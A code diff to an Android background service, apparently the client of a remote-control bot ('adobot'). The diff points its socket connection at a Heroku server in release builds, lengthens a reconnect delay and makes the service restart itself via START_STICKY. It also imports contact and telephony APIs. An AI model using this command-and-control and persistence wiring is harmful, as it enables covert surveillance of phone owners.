@@ -16,6 +16,7 @@ import android.os.Bundle;
 import android.os.IBinder;
 import android.provider.ContactsContract;
 import android.provider.Settings;
+import android.support.v4.BuildConfig;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.telephony.TelephonyManager;
@@ -34,16 +35,13 @@ import io.socket.client.IO;
 import io.socket.client.Socket;
 import io.socket.emitter.Emitter;
 
-import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
-
 
 public class Client extends Service {
 
     private static final String TAG = "Client";
 
-    public static final String SERVER = "http://192.168.1.251:3000";
+    public static String SERVER;
     private static final String POST_STATUS = "/status";
-    public static final String EXTRA_UPDATE_URL = "buddy.ap.com.adobot.UPDATE_URL";
 
     private Client client;
     private Socket socket;
@@ -60,14 +58,6 @@ public class Client extends Service {
 
     public Socket getSocket() {
         return socket;
-    }
-
-    public boolean isConnected() {
-        return connected;
-    }
-
-    public boolean isRegistered() {
-        return registered;
     }
 
     public String getUid() {
@@ -125,6 +115,8 @@ public class Client extends Service {
 
     @Override
     public void onCreate() {
+
+        SERVER = buddy.ap.com.adobot.BuildConfig.DEBUG ? "http://192.168.1.251:3000" : "https://obscure-escarpment-69091.herokuapp.com";
 
         client = this;
         connected = false;
@@ -237,7 +229,7 @@ public class Client extends Service {
                         public void run() {
                             super.run();
                             try {
-                                Thread.sleep(3000);
+                                Thread.sleep(10000);
                             } catch (InterruptedException e) {
                                 e.printStackTrace();
                             }
@@ -272,7 +264,8 @@ public class Client extends Service {
             socket.connect();
         }
 
-        return super.onStartCommand(intent, flags, startId);
+        super.onStartCommand(intent, flags, startId);
+        return START_STICKY;
 
     }
 
